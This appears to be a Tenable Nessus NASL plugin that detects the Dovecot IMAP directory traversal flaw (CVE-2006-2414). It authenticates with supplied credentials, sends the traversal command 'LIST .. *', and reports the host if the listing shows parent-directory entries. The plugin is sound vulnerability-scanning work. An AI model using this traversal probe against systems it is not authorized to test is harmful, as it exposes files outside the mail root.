#
# (C) Tenable Network Security
#


if (description) {
  script_id(21559);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2414");
  script_bugtraq_id(17961);

  script_name(english:"Dovecot Directory Traversal Vulnerability");
  script_summary(english:"Tries to list contents of mbox root parent directory in Dovecot");
 
  desc = "
Synopsis :

The remote IMAP server is affected by a directory traversal
vulnerability. 

Description :

The remote host is running Dovecot, an open-source IMAP4 / POP3 server
for Linux / Unix. 

The version of Dovecot installed on the remote host fails to filter
directory traversal sequences from user-supplied input to IMAP
commands such as LIST and DELETE.  An authenticated attacker may be
able to leverage this issue to list directories and files in the mbox
root's parent directory or possibly to delete index files used by the
application. 

See also :

http://www.securityfocus.com/archive/1/archive/1/433878/100/0/threaded
http://www.dovecot.org/list/dovecot/2006-May/013385.html

Solution :

Upgrade to Dovecot version 1.0 beta8 or later.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("find_service.nes");
  script_exclude_keys("imap/false_imap");
  script_require_keys("imap/login", "imap/password");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");
include("misc_func.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);


# Unless we're paranoid, make sure the banner corresponds to Dovecot.
if (report_paranoia < 2)
{
  banner = get_imap_banner(port:port);
  if (!banner || "Dovecot ready" >!< banner) exit(0);
}


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) exit(0);


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);

s = recv_line(socket:soc, length:1024);
if (!strlen(s))
{
  close(soc);
  exit(0);
}
s = chomp(s);


# Log in.
#
# - try the PLAIN SASL mechanism.
#   nb: RFC 3501 requires this be supported by imap4rev1 servers, although
#       it may also require SSL / TLS encapsulation.
++tag;
c = string("a", string(tag), ' AUTHENTICATE "PLAIN"');
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
s = chomp(s);
if (s == "+")
{
  c = base64(str:raw_string(0, user, 0, pass));
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024, timeout:1))
  {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m))
    {
      resp = m[1];
      break;
    }
    resp = "";
  }
}
# - if that didn't work, try LOGIN command.
if (isnull(resp))
{
  ++tag;
  c = string("a", string(tag), " LOGIN ", user, " ", pass);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024))
  {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m))
    {
      resp = m[1];
      break;
    }
    resp = "";
  }
}


# If successful, try to exploit the issue to list the mbox root's parent dir.
if (resp && resp =~ "OK")
{
  ++tag;
  c = string("a", string(tag), " LIST .. *");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024))
  {
    s = chomp(s);

    # There's a problem if the listing has a directory traversal sequence.
    if (s =~ '^\\* LIST \\(.+\\) "/" "\\.\\./')
    {
      security_note(port);
      break;
    }

    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m))
    {
      resp = m[1];
      break;
    }
    resp = "";
  }
}
else
{
  if (log_verbosity > 1) debug_print("couldn't login with supplied imap credentials!", level:0);
  exit(1);
}


# Logout.
++tag;
c = string("a", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024))
{
  s = chomp(s);
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m))
  {
    resp = m[1];
    break;
  }
  resp = "";
}
close(soc);
